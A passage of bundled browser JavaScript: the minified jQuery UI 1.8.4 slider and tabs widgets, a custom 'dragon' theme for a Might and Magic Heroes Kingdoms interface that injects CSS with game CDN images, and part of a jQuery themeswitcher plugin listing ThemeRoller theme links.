else return this._values()},_setOption:function(a,b){var c,e=0;if(d.isArray(this.options.values))e=this.options.values.length;d.Widget.prototype._setOption.apply(this,arguments);switch(a){case "disabled":if(b){this.handles.filter(".ui-state-focus").blur();this.handles.removeClass("ui-state-hover");this.handles.attr("disabled","disabled");this.element.addClass("ui-disabled")}else{this.handles.removeAttr("disabled");this.element.removeClass("ui-disabled")}break;case "orientation":this._detectOrientation();
this.element.removeClass("ui-slider-horizontal ui-slider-vertical").addClass("ui-slider-"+this.orientation);this._refreshValue();break;case "value":this._animateOff=true;this._refreshValue();this._change(null,0);this._animateOff=false;break;case "values":this._animateOff=true;this._refreshValue();for(c=0;c<e;c+=1)this._change(null,c);this._animateOff=false;break}},_value:function(){var a=this.options.value;return a=this._trimAlignValue(a)},_values:function(a){var b,c;if(arguments.length){b=this.options.values[a];
return b=this._trimAlignValue(b)}else{b=this.options.values.slice();for(c=0;c<b.length;c+=1)b[c]=this._trimAlignValue(b[c]);return b}},_trimAlignValue:function(a){if(a<this._valueMin())return this._valueMin();if(a>this._valueMax())return this._valueMax();var b=this.options.step>0?this.options.step:1,c=a%b;a=a-c;if(Math.abs(c)*2>=b)a+=c>0?b:-b;return parseFloat(a.toFixed(5))},_valueMin:function(){return this.options.min},_valueMax:function(){return this.options.max},_refreshValue:function(){var a=
this.options.range,b=this.options,c=this,e=!this._animateOff?b.animate:false,f,h={},g,i,j,l;if(this.options.values&&this.options.values.length)this.handles.each(function(k){f=(c.values(k)-c._valueMin())/(c._valueMax()-c._valueMin())*100;h[c.orientation==="horizontal"?"left":"bottom"]=f+"%";d(this).stop(1,1)[e?"animate":"css"](h,b.animate);if(c.options.range===true)if(c.orientation==="horizontal"){if(k===0)c.range.stop(1,1)[e?"animate":"css"]({left:f+"%"},b.animate);if(k===1)c.range[e?"animate":"css"]({width:f-
g+"%"},{queue:false,duration:b.animate})}else{if(k===0)c.range.stop(1,1)[e?"animate":"css"]({bottom:f+"%"},b.animate);if(k===1)c.range[e?"animate":"css"]({height:f-g+"%"},{queue:false,duration:b.animate})}g=f});else{i=this.value();j=this._valueMin();l=this._valueMax();f=l!==j?(i-j)/(l-j)*100:0;h[c.orientation==="horizontal"?"left":"bottom"]=f+"%";this.handle.stop(1,1)[e?"animate":"css"](h,b.animate);if(a==="min"&&this.orientation==="horizontal")this.range.stop(1,1)[e?"animate":"css"]({width:f+"%"},
b.animate);if(a==="max"&&this.orientation==="horizontal")this.range[e?"animate":"css"]({width:100-f+"%"},{queue:false,duration:b.animate});if(a==="min"&&this.orientation==="vertical")this.range.stop(1,1)[e?"animate":"css"]({height:f+"%"},b.animate);if(a==="max"&&this.orientation==="vertical")this.range[e?"animate":"css"]({height:100-f+"%"},{queue:false,duration:b.animate})}}});d.extend(d.ui.slider,{version:"1.8.4"})})(jQuery);
(function(d,p){function u(){return++v}function w(){return++x}var v=0,x=0;d.widget("ui.tabs",{options:{add:null,ajaxOptions:null,cache:false,cookie:null,collapsible:false,disable:null,disabled:[],enable:null,event:"click",fx:null,idPrefix:"ui-tabs-",load:null,panelTemplate:"<div></div>",remove:null,select:null,show:null,spinner:"<em>Loading&#8230;</em>",tabTemplate:"<li><a href='#{href}'><span>#{label}</span></a></li>"},_create:function(){this._tabify(true)},_setOption:function(a,e){if(a=="selected")this.options.collapsible&&
e==this.options.selected||this.select(e);else{this.options[a]=e;this._tabify()}},_tabId:function(a){return a.title&&a.title.replace(/\s/g,"_").replace(/[^A-Za-z0-9\-_:\.]/g,"")||this.options.idPrefix+u()},_sanitizeSelector:function(a){return a.replace(/:/g,"\\:")},_cookie:function(){var a=this.cookie||(this.cookie=this.options.cookie.name||"ui-tabs-"+w());return d.cookie.apply(null,[a].concat(d.makeArray(arguments)))},_ui:function(a,e){return{tab:a,panel:e,index:this.anchors.index(a)}},_cleanup:function(){this.lis.filter(".ui-state-processing").removeClass("ui-state-processing").find("span:data(label.tabs)").each(function(){var a=
d(this);a.html(a.data("label.tabs")).removeData("label.tabs")})},_tabify:function(a){function e(g,f){g.css("display","");!d.support.opacity&&f.opacity&&g[0].style.removeAttribute("filter")}var b=this,c=this.options,h=/^#.+/;this.list=this.element.find("ol,ul").eq(0);this.lis=d("li:has(a[href])",this.list);this.anchors=this.lis.map(function(){return d("a",this)[0]});this.panels=d([]);this.anchors.each(function(g,f){var j=d(f).attr("href"),l=j.split("#")[0],q;if(l&&(l===location.toString().split("#")[0]||
(q=d("base")[0])&&l===q.href)){j=f.hash;f.href=j}if(h.test(j))b.panels=b.panels.add(b._sanitizeSelector(j));else if(j!=="#"){d.data(f,"href.tabs",j);d.data(f,"load.tabs",j.replace(/#.*$/,""));j=b._tabId(f);f.href="#"+j;f=d("#"+j);if(!f.length){f=d(c.panelTemplate).attr("id",j).addClass("ui-tabs-panel ui-widget-content ui-corner-bottom").insertAfter(b.panels[g-1]||b.list);f.data("destroy.tabs",true)}b.panels=b.panels.add(f)}else c.disabled.push(g)});if(a){this.element.addClass("ui-tabs ui-widget ui-widget-content ui-corner-all");
this.list.addClass("ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all");this.lis.addClass("ui-state-default ui-corner-top");this.panels.addClass("ui-tabs-panel ui-widget-content ui-corner-bottom");if(c.selected===p){location.hash&&this.anchors.each(function(g,f){if(f.hash==location.hash){c.selected=g;return false}});if(typeof c.selected!=="number"&&c.cookie)c.selected=parseInt(b._cookie(),10);if(typeof c.selected!=="number"&&this.lis.filter(".ui-tabs-selected").length)c.selected=
this.lis.index(this.lis.filter(".ui-tabs-selected"));c.selected=c.selected||(this.lis.length?0:-1)}else if(c.selected===null)c.selected=-1;c.selected=c.selected>=0&&this.anchors[c.selected]||c.selected<0?c.selected:0;c.disabled=d.unique(c.disabled.concat(d.map(this.lis.filter(".ui-state-disabled"),function(g){return b.lis.index(g)}))).sort();d.inArray(c.selected,c.disabled)!=-1&&c.disabled.splice(d.inArray(c.selected,c.disabled),1);this.panels.addClass("ui-tabs-hide");this.lis.removeClass("ui-tabs-selected ui-state-active");
if(c.selected>=0&&this.anchors.length){this.panels.eq(c.selected).removeClass("ui-tabs-hide");this.lis.eq(c.selected).addClass("ui-tabs-selected ui-state-active");b.element.queue("tabs",function(){b._trigger("show",null,b._ui(b.anchors[c.selected],b.panels[c.selected]))});this.load(c.selected)}d(window).bind("unload",function(){b.lis.add(b.anchors).unbind(".tabs");b.lis=b.anchors=b.panels=null})}else c.selected=this.lis.index(this.lis.filter(".ui-tabs-selected"));this.element[c.collapsible?"addClass":
"removeClass"]("ui-tabs-collapsible");c.cookie&&this._cookie(c.selected,c.cookie);a=0;for(var i;i=this.lis[a];a++)d(i)[d.inArray(a,c.disabled)!=-1&&!d(i).hasClass("ui-tabs-selected")?"addClass":"removeClass"]("ui-state-disabled");c.cache===false&&this.anchors.removeData("cache.tabs");this.lis.add(this.anchors).unbind(".tabs");if(c.event!=="mouseover"){var k=function(g,f){f.is(":not(.ui-state-disabled)")&&f.addClass("ui-state-"+g)},n=function(g,f){f.removeClass("ui-state-"+g)};this.lis.bind("mouseover.tabs",
function(){k("hover",d(this))});this.lis.bind("mouseout.tabs",function(){n("hover",d(this))});this.anchors.bind("focus.tabs",function(){k("focus",d(this).closest("li"))});this.anchors.bind("blur.tabs",function(){n("focus",d(this).closest("li"))})}var m,o;if(c.fx)if(d.isArray(c.fx)){m=c.fx[0];o=c.fx[1]}else m=o=c.fx;var r=o?function(g,f){d(g).closest("li").addClass("ui-tabs-selected ui-state-active");f.hide().removeClass("ui-tabs-hide").animate(o,o.duration||"normal",function(){e(f,o);b._trigger("show",
null,b._ui(g,f[0]))})}:function(g,f){d(g).closest("li").addClass("ui-tabs-selected ui-state-active");f.removeClass("ui-tabs-hide");b._trigger("show",null,b._ui(g,f[0]))},s=m?function(g,f){f.animate(m,m.duration||"normal",function(){b.lis.removeClass("ui-tabs-selected ui-state-active");f.addClass("ui-tabs-hide");e(f,m);b.element.dequeue("tabs")})}:function(g,f){b.lis.removeClass("ui-tabs-selected ui-state-active");f.addClass("ui-tabs-hide");b.element.dequeue("tabs")};this.anchors.bind(c.event+".tabs",
function(){var g=this,f=d(g).closest("li"),j=b.panels.filter(":not(.ui-tabs-hide)"),l=d(b._sanitizeSelector(g.hash));if(f.hasClass("ui-tabs-selected")&&!c.collapsible||f.hasClass("ui-state-disabled")||f.hasClass("ui-state-processing")||b._trigger("select",null,b._ui(this,l[0]))===false){this.blur();return false}c.selected=b.anchors.index(this);b.abort();if(c.collapsible)if(f.hasClass("ui-tabs-selected")){c.selected=-1;c.cookie&&b._cookie(c.selected,c.cookie);b.element.queue("tabs",function(){s(g,
j)}).dequeue("tabs");this.blur();return false}else if(!j.length){c.cookie&&b._cookie(c.selected,c.cookie);b.element.queue("tabs",function(){r(g,l)});b.load(b.anchors.index(this));this.blur();return false}c.cookie&&b._cookie(c.selected,c.cookie);if(l.length){j.length&&b.element.queue("tabs",function(){s(g,j)});b.element.queue("tabs",function(){r(g,l)});b.load(b.anchors.index(this))}else throw"jQuery UI Tabs: Mismatching fragment identifier.";d.browser.msie&&this.blur()});this.anchors.bind("click.tabs",
function(){return false})},_getIndex:function(a){if(typeof a=="string")a=this.anchors.index(this.anchors.filter("[href$="+a+"]"));return a},destroy:function(){var a=this.options;this.abort();this.element.unbind(".tabs").removeClass("ui-tabs ui-widget ui-widget-content ui-corner-all ui-tabs-collapsible").removeData("tabs");this.list.removeClass("ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all");this.anchors.each(function(){var e=d.data(this,"href.tabs");if(e)this.href=
e;var b=d(this).unbind(".tabs");d.each(["href","load","cache"],function(c,h){b.removeData(h+".tabs")})});this.lis.unbind(".tabs").add(this.panels).each(function(){d.data(this,"destroy.tabs")?d(this).remove():d(this).removeClass("ui-state-default ui-corner-top ui-tabs-selected ui-state-active ui-state-hover ui-state-focus ui-state-disabled ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide")});a.cookie&&this._cookie(null,a.cookie);return this},add:function(a,e,b){if(b===p)b=this.anchors.length;
var c=this,h=this.options;e=d(h.tabTemplate.replace(/#\{href\}/g,a).replace(/#\{label\}/g,e));a=!a.indexOf("#")?a.replace("#",""):this._tabId(d("a",e)[0]);e.addClass("ui-state-default ui-corner-top").data("destroy.tabs",true);var i=d("#"+a);i.length||(i=d(h.panelTemplate).attr("id",a).data("destroy.tabs",true));i.addClass("ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide");if(b>=this.lis.length){e.appendTo(this.list);i.appendTo(this.list[0].parentNode)}else{e.insertBefore(this.lis[b]);
i.insertBefore(this.panels[b])}h.disabled=d.map(h.disabled,function(k){return k>=b?++k:k});this._tabify();if(this.anchors.length==1){h.selected=0;e.addClass("ui-tabs-selected ui-state-active");i.removeClass("ui-tabs-hide");this.element.queue("tabs",function(){c._trigger("show",null,c._ui(c.anchors[0],c.panels[0]))});this.load(0)}this._trigger("add",null,this._ui(this.anchors[b],this.panels[b]));return this},remove:function(a){a=this._getIndex(a);var e=this.options,b=this.lis.eq(a).remove(),c=this.panels.eq(a).remove();
if(b.hasClass("ui-tabs-selected")&&this.anchors.length>1)this.select(a+(a+1<this.anchors.length?1:-1));e.disabled=d.map(d.grep(e.disabled,function(h){return h!=a}),function(h){return h>=a?--h:h});this._tabify();this._trigger("remove",null,this._ui(b.find("a")[0],c[0]));return this},enable:function(a){a=this._getIndex(a);var e=this.options;if(d.inArray(a,e.disabled)!=-1){this.lis.eq(a).removeClass("ui-state-disabled");e.disabled=d.grep(e.disabled,function(b){return b!=a});this._trigger("enable",null,
this._ui(this.anchors[a],this.panels[a]));return this}},disable:function(a){a=this._getIndex(a);var e=this.options;if(a!=e.selected){this.lis.eq(a).addClass("ui-state-disabled");e.disabled.push(a);e.disabled.sort();this._trigger("disable",null,this._ui(this.anchors[a],this.panels[a]))}return this},select:function(a){a=this._getIndex(a);if(a==-1)if(this.options.collapsible&&this.options.selected!=-1)a=this.options.selected;else return this;this.anchors.eq(a).trigger(this.options.event+".tabs");return this},
load:function(a){a=this._getIndex(a);var e=this,b=this.options,c=this.anchors.eq(a)[0],h=d.data(c,"load.tabs");this.abort();if(!h||this.element.queue("tabs").length!==0&&d.data(c,"cache.tabs"))this.element.dequeue("tabs");else{this.lis.eq(a).addClass("ui-state-processing");if(b.spinner){var i=d("span",c);i.data("label.tabs",i.html()).html(b.spinner)}this.xhr=d.ajax(d.extend({},b.ajaxOptions,{url:h,success:function(k,n){d(e._sanitizeSelector(c.hash)).html(k);e._cleanup();b.cache&&d.data(c,"cache.tabs",
true);e._trigger("load",null,e._ui(e.anchors[a],e.panels[a]));try{b.ajaxOptions.success(k,n)}catch(m){}},error:function(k,n){e._cleanup();e._trigger("load",null,e._ui(e.anchors[a],e.panels[a]));try{b.ajaxOptions.error(k,n,a,c)}catch(m){}}}));e.element.dequeue("tabs");return this}},abort:function(){this.element.queue([]);this.panels.stop(false,true);this.element.queue("tabs",this.element.queue("tabs").splice(-2,2));if(this.xhr){this.xhr.abort();delete this.xhr}this._cleanup();return this},url:function(a,
e){this.anchors.eq(a).removeData("cache.tabs").data("load.tabs",e);return this},length:function(){return this.anchors.length}});d.extend(d.ui.tabs,{version:"1.8.4"});d.extend(d.ui.tabs.prototype,{rotation:null,rotate:function(a,e){var b=this,c=this.options,h=b._rotate||(b._rotate=function(i){clearTimeout(b.rotation);b.rotation=setTimeout(function(){var k=c.selected;b.select(++k<b.anchors.length?k:0)},a);i&&i.stopPropagation()});e=b._unrotate||(b._unrotate=!e?function(i){i.clientX&&b.rotate(null)}:
function(){t=c.selected;h()});if(a){this.element.bind("tabsshow",h);this.anchors.bind(c.event+".tabs",e);h()}else{clearTimeout(b.rotation);this.element.unbind("tabsshow",h);this.anchors.unbind(c.event+".tabs",e);delete this._rotate;delete this._unrotate}return this}})})(jQuery);
/* dragon azur */

	function addStyle(css) {
		var style = document.createElement('style');
		style.type = 'text/css';
		style.innerHTML = css; // style.textContent
		document.getElementsByTagName('head')[0].appendChild(style);
		return style;
	}

	var dragon_style1,dragon_style2,dragon_style3,dragon_theme_use=false;
	var add_dragon_theme = function(){
		dragon_theme_use = true;
		dragon_style1 = addStyle('.ui-dialog{background-color:white;} .ui-dialog-titlebar{text-align:center !important;background-position: 0px -340px;background-size:5000px 890px;background-image:url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.129-8-MTR/img/css_sprite/Label_Buttons.png);}');
		var uiWidgetContent = '.ui-widget-content{'
			+ 'background-image:url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.129-8-MTR/img/background/metal.jpg) !important;'
			+ 'color:black;'
			+ 'font-weight:bold !important;'
			+ '}';
		dragon_style2 = addStyle('.ui-button{background-size:482% 450px !important;background-image:url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.129-8-MTR/img/store/storeIcons.png) !important; background-position: -81% -162px !important;}');
		dragon_style3 = addStyle('.ui-button:hover{background-position: -45% -162px !important;}'
			+uiWidgetContent
		);
	};
	
	var remove_dragon_theme = function(){
		if(!dragon_theme_use)
			return;
		dragon_theme_use = false;
		var head = document.getElementsByTagName('head')[0];
		head.removeChild(dragon_style1);
		head.removeChild(dragon_style2);
		head.removeChild(dragon_style3);
	}





/* jQuery plugin themeswitcher
---------------------------------------------------------------------*/
$.fn.themeswitcher = function(settings){
	var options = jQuery.extend({
		loadTheme: null,
		initialText: 'Switch Theme',
		width: 150,
		height: 200,
		buttonPreText: 'Theme: ',
		closeOnSelect: true,
		buttonHeight: 14,
		cookieName: 'jquery-ui-theme',
		onOpen: function(){},
		onClose: function(){},
		onSelect: function(){}
	}, settings);

	//markup 
	var button = $('<a href="#" class="jquery-ui-themeswitcher-trigger"><span class="jquery-ui-themeswitcher-icon"></span><span class="jquery-ui-themeswitcher-title">'+ options.initialText +'</span></a>');
	var dragon_theme = 	'<li><a href="#dragon"><img src="http://img440.imageshack.us/img440/4826/dragonqg.jpg" alt="UI Lightness" title="UI Lightness" />			<span class="themeName">MMHK Dragon</span>		</a></li>';
	var switcherpane = $('<div class="jquery-ui-themeswitcher"><div id="themeGallery">	<ul>	'+dragon_theme+'	<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Trebuchet+MS,+Tahoma,+Verdana,+Arial,+sans-serif&amp;fwDefault=bold&amp;fsDefault=1.1em&amp;cornerRadius=4px&amp;bgColorHeader=f6a828&amp;bgTextureHeader=12_gloss_wave.png&amp;bgImgOpacityHeader=35&amp;borderColorHeader=e78f08&amp;fcHeader=ffffff&amp;iconColorHeader=ffffff&amp;bgColorContent=eeeeee&amp;bgTextureContent=03_highlight_soft.png&amp;bgImgOpacityContent=100&amp;borderColorContent=dddddd&amp;fcContent=333333&amp;iconColorContent=222222&amp;bgColorDefault=f6f6f6&amp;bgTextureDefault=02_glass.png&amp;bgImgOpacityDefault=100&amp;borderColorDefault=cccccc&amp;fcDefault=1c94c4&amp;iconColorDefault=ef8c08&amp;bgColorHover=fdf5ce&amp;bgTextureHover=02_glass.png&amp;bgImgOpacityHover=100&amp;borderColorHover=fbcb09&amp;fcHover=c77405&amp;iconColorHover=ef8c08&amp;bgColorActive=ffffff&amp;bgTextureActive=02_glass.png&amp;bgImgOpacityActive=65&amp;borderColorActive=fbd850&amp;fcActive=eb8f00&amp;iconColorActive=ef8c08&amp;bgColorHighlight=ffe45c&amp;bgTextureHighlight=03_highlight_soft.png&amp;bgImgOpacityHighlight=75&amp;borderColorHighlight=fed22f&amp;fcHighlight=363636&amp;iconColorHighlight=228ef1&amp;bgColorError=b81900&amp;bgTextureError=08_diagonals_thick.png&amp;bgImgOpacityError=18&amp;borderColorError=cd0a0a&amp;fcError=ffffff&amp;iconColorError=ffd27a&amp;bgColorOverlay=666666&amp;bgTextureOverlay=08_diagonals_thick.png&amp;bgImgOpacityOverlay=20&amp;opacityOverlay=50&amp;bgColorShadow=000000&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=10&amp;opacityShadow=20&amp;thicknessShadow=5px&amp;offsetTopShadow=-5px&amp;offsetLeftShadow=-5px&amp;cornerRadiusShadow=5px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_ui_light.png" alt="UI Lightness" title="UI Lightness" />			<span class="themeName">UI lightness</span>		</a></li>				<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Segoe+UI%2C+Arial%2C+sans-serif&amp;fwDefault=bold&amp;fsDefault=1.1em&amp;cornerRadius=6px&amp;bgColorHeader=333333&amp;bgTextureHeader=12_gloss_wave.png&amp;bgImgOpacityHeader=25&amp;borderColorHeader=333333&amp;fcHeader=ffffff&amp;iconColorHeader=ffffff&amp;bgColorContent=000000&amp;bgTextureContent=05_inset_soft.png&amp;bgImgOpacityContent=25&amp;borderColorContent=666666&amp;fcContent=ffffff&amp;iconColorContent=cccccc&amp;bgColorDefault=555555&amp;bgTextureDefault=02_glass.png&amp;bgImgOpacityDefault=20&amp;borderColorDefault=666666&amp;fcDefault=eeeeee&amp;iconColorDefault=cccccc&amp;bgColorHover=0078a3&amp;bgTextureHover=02_glass.png&amp;bgImgOpacityHover=40&amp;borderColorHover=59b4d4&amp;fcHover=ffffff&amp;iconColorHover=ffffff&amp;bgColorActive=f58400&amp;bgTextureActive=05_inset_soft.png&amp;bgImgOpacityActive=30&amp;borderColorActive=ffaf0f&amp;fcActive=ffffff&amp;iconColorActive=222222&amp;bgColorHighlight=eeeeee&amp;bgTextureHighlight=03_highlight_soft.png&amp;bgImgOpacityHighlight=80&amp;borderColorHighlight=cccccc&amp;fcHighlight=2e7db2&amp;iconColorHighlight=4b8e0b&amp;bgColorError=ffc73d&amp;bgTextureError=02_glass.png&amp;bgImgOpacityError=40&amp;borderColorError=ffb73d&amp;fcError=111111&amp;iconColorError=a83300&amp;bgColorOverlay=5c5c5c&amp;bgTextureOverlay=01_flat.png&amp;bgImgOpacityOverlay=50&amp;opacityOverlay=80&amp;bgColorShadow=cccccc&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=30&amp;opacityShadow=60&amp;thicknessShadow=7px&amp;offsetTopShadow=-7px&amp;offsetLeftShadow=-7px&amp;cornerRadiusShadow=8px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_ui_dark.png" alt="UI Darkness" title="UI Darkness" />			<span class="themeName">UI darkness</span>		</a></li>			<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Verdana,Arial,sans-serif&amp;fwDefault=normal&amp;fsDefault=1.1em&amp;cornerRadius=4px&amp;bgColorHeader=cccccc&amp;bgTextureHeader=03_highlight_soft.png&amp;bgImgOpacityHeader=75&amp;borderColorHeader=aaaaaa&amp;fcHeader=222222&amp;iconColorHeader=222222&amp;bgColorContent=ffffff&amp;bgTextureContent=01_flat.png&amp;bgImgOpacityContent=75&amp;borderColorContent=aaaaaa&amp;fcContent=222222&amp;iconColorContent=222222&amp;bgColorDefault=e6e6e6&amp;bgTextureDefault=02_glass.png&amp;bgImgOpacityDefault=75&amp;borderColorDefault=d3d3d3&amp;fcDefault=555555&amp;iconColorDefault=888888&amp;bgColorHover=dadada&amp;bgTextureHover=02_glass.png&amp;bgImgOpacityHover=75&amp;borderColorHover=999999&amp;fcHover=212121&amp;iconColorHover=454545&amp;bgColorActive=ffffff&amp;bgTextureActive=02_glass.png&amp;bgImgOpacityActive=65&amp;borderColorActive=aaaaaa&amp;fcActive=212121&amp;iconColorActive=454545&amp;bgColorHighlight=fbf9ee&amp;bgTextureHighlight=02_glass.png&amp;bgImgOpacityHighlight=55&amp;borderColorHighlight=fcefa1&amp;fcHighlight=363636&amp;iconColorHighlight=2e83ff&amp;bgColorError=fef1ec&amp;bgTextureError=02_glass.png&amp;bgImgOpacityError=95&amp;borderColorError=cd0a0a&amp;fcError=cd0a0a&amp;iconColorError=cd0a0a&amp;bgColorOverlay=aaaaaa&amp;bgTextureOverlay=01_flat.png&amp;bgImgOpacityOverlay=0&amp;opacityOverlay=30&amp;bgColorShadow=aaaaaa&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=0&amp;opacityShadow=30&amp;thicknessShadow=8px&amp;offsetTopShadow=-8px&amp;offsetLeftShadow=-8px&amp;cornerRadiusShadow=8px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_smoothness.png" alt="Smoothness" title="Smoothness" />			<span class="themeName">Smoothness</span>		</a></li>							<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Verdana%2CArial%2Csans-serif&amp;fwDefault=normal&amp;fsDefault=1.1em&amp;cornerRadius=5px&amp;bgColorHeader=2191c0&amp;bgTextureHeader=12_gloss_wave.png&amp;bgImgOpacityHeader=75&amp;borderColorHeader=4297d7&amp;fcHeader=eaf5f7&amp;iconColorHeader=d8e7f3&amp;bgColorContent=fcfdfd&amp;bgTextureContent=06_inset_hard.png&amp;bgImgOpacityContent=100&amp;borderColorContent=a6c9e2&amp;fcContent=222222&amp;iconColorContent=0078ae&amp;bgColorDefault=0078ae&amp;bgTextureDefault=02_glass.png&amp;bgImgOpacityDefault=45&amp;borderColorDefault=77d5f7&amp;fcDefault=ffffff&amp;iconColorDefault=e0fdff&amp;bgColorHover=79c9ec&amp;bgTextureHover=02_glass.png&amp;bgImgOpacityHover=75&amp;borderColorHover=448dae&amp;fcHover=026890&amp;iconColorHover=056b93&amp;bgColorActive=6eac2c&amp;bgTextureActive=12_gloss_wave.png&amp;bgImgOpacityActive=50&amp;borderColorActive=acdd4a&amp;fcActive=ffffff&amp;iconColorActive=f5e175&amp;bgColorHighlight=f8da4e&amp;bgTextureHighlight=02_glass.png&amp;bgImgOpacityHighlight=55&amp;borderColorHighlight=fcd113&amp;fcHighlight=915608&amp;iconColorHighlight=f7a50d&amp;bgColorError=e14f1c&amp;bgTextureError=12_gloss_wave.png&amp;bgImgOpacityError=45&amp;borderColorError=cd0a0a&amp;fcError=ffffff&amp;iconColorError=fcd113&amp;bgColorOverlay=aaaaaa&amp;bgTextureOverlay=01_flat.png&amp;bgImgOpacityOverlay=75&amp;opacityOverlay=30&amp;bgColorShadow=999999&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=55&amp;opacityShadow=45&amp;thicknessShadow=0px&amp;offsetTopShadow=5px&amp;offsetLeftShadow=5px&amp;cornerRadiusShadow=5px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_start_menu.png" alt="Start" title="Start" />			<span class="themeName">Start</span>		</a></li>				<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Lucida+Grande,+Lucida+Sans,+Arial,+sans-serif&amp;fwDefault=bold&amp;fsDefault=1.1em&amp;cornerRadius=5px&amp;bgColorHeader=5c9ccc&amp;bgTextureHeader=12_gloss_wave.png&amp;bgImgOpacityHeader=55&amp;borderColorHeader=4297d7&amp;fcHeader=ffffff&amp;iconColorHeader=d8e7f3&amp;bgColorContent=fcfdfd&amp;bgTextureContent=06_inset_hard.png&amp;bgImgOpacityContent=100&amp;borderColorContent=a6c9e2&amp;fcContent=222222&amp;iconColorContent=469bdd&amp;bgColorDefault=dfeffc&amp;bgTextureDefault=02_glass.png&amp;bgImgOpacityDefault=85&amp;borderColorDefault=c5dbec&amp;fcDefault=2e6e9e&amp;iconColorDefault=6da8d5&amp;bgColorHover=d0e5f5&amp;bgTextureHover=02_glass.png&amp;bgImgOpacityHover=75&amp;borderColorHover=79b7e7&amp;fcHover=1d5987&amp;iconColorHover=217bc0&amp;bgColorActive=f5f8f9&amp;bgTextureActive=06_inset_hard.png&amp;bgImgOpacityActive=100&amp;borderColorActive=79b7e7&amp;fcActive=e17009&amp;iconColorActive=f9bd01&amp;bgColorHighlight=fbec88&amp;bgTextureHighlight=01_flat.png&amp;bgImgOpacityHighlight=55&amp;borderColorHighlight=fad42e&amp;fcHighlight=363636&amp;iconColorHighlight=2e83ff&amp;bgColorError=fef1ec&amp;bgTextureError=02_glass.png&amp;bgImgOpacityError=95&amp;borderColorError=cd0a0a&amp;fcError=cd0a0a&amp;iconColorError=cd0a0a&amp;bgColorOverlay=aaaaaa&amp;bgTextureOverlay=01_flat.png&amp;bgImgOpacityOverlay=0&amp;opacityOverlay=30&amp;bgColorShadow=aaaaaa&amp;bgTextureShadow=01_flat.png&amp;bgImgOpacityShadow=0&amp;opacityShadow=30&amp;thicknessShadow=8px&amp;offsetTopShadow=-8px&amp;offsetLeftShadow=-8px&amp;cornerRadiusShadow=8px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_windoze.png" alt="Redmond" title="Redmond" />			<span class="themeName">Redmond</span>		</a></li>						<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Segoe+UI%2C+Arial%2C+sans-serif&fwDefault=bold&fsDefault=1.1em&cornerRadius=8px&bgColorHeader=817865&bgTextureHeader=12_gloss_wave.png&bgImgOpacityHeader=45&borderColorHeader=494437&fcHeader=ffffff&iconColorHeader=fadc7a&bgColorContent=feeebd&bgTextureContent=03_highlight_soft.png&bgImgOpacityContent=100&borderColorContent=8e846b&fcContent=383838&iconColorContent=d19405&bgColorDefault=fece2f&bgTextureDefault=12_gloss_wave.png&bgImgOpacityDefault=60&borderColorDefault=d19405&fcDefault=4c3000&iconColorDefault=3d3d3d&bgColorHover=ffdd57&bgTextureHover=12_gloss_wave.png&bgImgOpacityHover=70&borderColorHover=a45b13&fcHover=381f00&iconColorHover=bd7b00&bgColorActive=ffffff&bgTextureActive=05_inset_soft.png&bgImgOpacityActive=30&borderColorActive=655e4e&fcActive=0074c7&iconColorActive=eb990f&bgColorHighlight=fff9e5&bgTextureHighlight=12_gloss_wave.png&bgImgOpacityHighlight=90&borderColorHighlight=eeb420&fcHighlight=1f1f1f&iconColorHighlight=ed9f26&bgColorError=d34d17&bgTextureError=07_diagonals_medium.png&bgImgOpacityError=20&borderColorError=ffb73d&fcError=ffffff&iconColorError=ffe180&bgColorOverlay=5c5c5c&bgTextureOverlay=01_flat.png&bgImgOpacityOverlay=50&opacityOverlay=80&bgColorShadow=cccccc&bgTextureShadow=01_flat.png&bgImgOpacityShadow=30&opacityShadow=60&thicknessShadow=7px&offsetTopShadow=-7px&offsetLeftShadow=-7px&cornerRadiusShadow=8px">			<img src="http://jqueryui.com/themeroller/images/themeGallery/theme_90_sunny.png" alt="Sunny" title="Sunny" />			<span class="themeName">Sunny</span>		</a></li>						<li><a href="http://jqueryui.com/themeroller/css/parseTheme.css.php?ffDefault=Trebuchet+MS%2C+Helvetica%2C+Arial%2C+sans-serif&fwDefault=bold&fsDefault=1.1em&cornerRadius=6px&bgColorHeader=dddddd&bgTextureHeader=02_glass.png&bgImgOpacityHeader=35&borderColorHeader=bbbbbb&fcHeader=444444&iconColorHeader=999999&bgColorContent=c9c9c9&bgTextureContent=05_inset_soft.png&bgImgOpacityContent=50&borderColorContent=aaaaaa&fcContent=333333&iconColorContent=999999&bgColorDefault=eeeeee&bgTextureDefault=02_glass.png&bgImgOpacityDefault=60&borderColorDefault=cccccc&fcDefault=3383bb&iconColorDefault=70b2e1&bgColorHover=f8f8f8&bgTextureHover=02_glass.png&bgImgOpacityHover=100&borderColorHover=bbbbbb&fcHover=599fcf&iconColorHover=3383bb&bgColorActive=999999&bgTextureActive=06_inset_hard.png&bgImgOpacityActive=75&borderColorActive=999999&fcActive=ffffff&iconColorActive=454545&bgColorHighlight=eeeeee&bgTextureHighlight=01_flat.png&bgImgOpacityHighlight=55&borderColorHighlight=ffffff&fcHighlight=444444&iconColorHighlight=338